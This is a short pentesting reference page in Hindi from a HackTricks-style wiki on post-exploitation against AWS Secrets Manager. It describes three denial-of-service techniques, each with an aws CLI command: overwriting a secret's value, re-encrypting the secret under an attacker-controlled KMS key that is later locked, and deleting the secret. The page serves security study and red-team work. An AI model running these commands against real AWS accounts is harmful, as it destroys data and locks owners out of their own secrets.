# AWS - Secrets Manager Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

अधिक जानकारी के लिए देखें:

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Secrets पढ़ें

ये **secrets स्वयं संवेदनशील जानकारी** हैं, [check the privesc page](../aws-privilege-escalation/aws-secrets-manager-privesc.md) यह जानने के लिए कि इन्हें कैसे पढ़ना है।

### DoS Change Secret Value

secret के मान को बदलकर आप उन सभी सिस्टम्स को **DoS कर सकते हैं जो उस मान पर निर्भर करते हैं।**

> [!WARNING]
> ध्यान दें कि पिछले मान भी संग्रहीत होते हैं, इसलिए पुराने मान पर वापस जाना आसान है।
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

यदि हमलावर के पास secretsmanager:UpdateSecret permission है, तो वे secret को हमलावर के स्वामित्व वाले KMS key का उपयोग करने के लिए कॉन्फ़िगर कर सकते हैं। वह key प्रारम्भ में इस तरह से सेट की गई होती है कि कोई भी उसे एक्सेस और उपयोग कर सकता है, इसलिए secret को नए key के साथ अपडेट करना संभव हो पाता है। यदि वह key एक्सेस करने योग्य नहीं होती, तो secret को अपडेट नहीं किया जा सकता था।

secret के लिए key बदलने के बाद, हमलावर अपनी key की कॉन्फ़िगरेशन बदल देता है ताकि केवल वही उसे एक्सेस कर सके। इस तरह, secret के बाद के संस्करण नए key के साथ एन्क्रिप्ट होंगे, और क्योंकि उस key तक कोई पहुँच नहीं होगी, secret को पुनः प्राप्त करने की क्षमता खो जाएगी।

यह ध्यान देने योग्य है कि यह असमर्थता केवल बाद के संस्करणों में ही होगी, जब secret की सामग्री बदल जाएगी, क्योंकि वर्तमान संस्करण अभी भी मूल KMS key से एन्क्रिप्टेड है।
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Deleting Secret

एक secret को delete करने के लिए न्यूनतम दिनों की संख्या 7 है
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
{{#include ../../../banners/hacktricks-training.md}}
